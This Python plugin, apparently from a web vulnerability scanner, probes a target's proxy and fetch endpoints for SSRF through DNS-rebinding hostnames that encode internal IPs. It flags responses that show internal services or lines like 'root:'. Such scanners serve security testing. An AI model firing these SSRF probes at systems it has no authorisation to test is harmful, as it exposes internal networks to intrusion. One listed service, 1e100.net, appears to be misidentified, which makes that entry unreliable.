from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity


@register_scanner(manifest=ScannerManifest(
    name="dns_rebinding_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=50,
    produces_tag_patterns=["dns-rebinding", "ssrf-bypass", "pin-rebinding"],
    produces_endpoint_types=[],
))
class DnsRebindingScanner(BaseScanner):
    name = "dns_rebinding_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()
        base = target.url.rstrip("/")

        rebind_urls = [
            f"{base}/proxy",
            f"{base}/fetch",
            f"{base}/api/proxy",
            f"{base}/api/fetch",
            f"{base}/image",
            f"{base}/api/image",
            f"{base}/avatar",
            f"{base}/crawl",
            f"{base}/api/crawl",
            f"{base}/url",
            f"{base}/api/url",
        ]

        dns_rebinding_services = [
            "1e100.net",
            "nip.io",
            "xip.io",
            "sslip.io",
        ]

        internal_ips = [
            "127.0.0.1",
            "127.0.0.1:80",
            "127.0.0.1:8080",
            "0.0.0.0:22",
            "10.0.0.1",
            "192.168.1.1",
            "172.16.0.1",
        ]

        for proxy_url in rebind_urls:
            for ip in internal_ips:
                for service in dns_rebinding_services:
                    rebind_host = f"{ip.replace('.', '-')}.{service}"
                    target_url = f"{proxy_url}?url=http://{rebind_host}/"
                    try:
                        resp = await client.get(target_url, follow_redirects=False, timeout=10)
                        self._stats["requests"] += 1
                        body = (resp.text or "").lower()

                        if any(kw in body for kw in
                               ["ssh-", "openbsd", "ubuntu", "apache", "nginx",
                                "iis", "welcome", "it works", "dashboard",
                                "login", "root:", "refused"]):
                            if resp.status_code in (200, 302):
                                ep = self.make_endpoint(url=target_url, status_code=resp.status_code, discovered_by=self.name)
                                endpoints.append(ep)
                                findings.append(self.make_finding(
                                    title="DNS Rebinding — Internal Service Access",
                                    description=f"DNS rebinding probe to {rebind_host} via {proxy_url} returned internal service content.",
                                    severity=FindingSeverity.CRITICAL.value,
                                    endpoint=ep,
                                    evidence={
                                        "proxy_url": proxy_url,
                                        "rebind_host": rebind_host,
                                        "internal_ip": ip,
                                        "status": resp.status_code,
                                        "body_preview": body[:200],
                                    },
                                    confidence=0.7,
                                    tags=["dns-rebinding", "ssrf-bypass", "internal-network"],
                                ))
                    except Exception:
                        self._stats["errors"] += 1

        return findings, endpoints
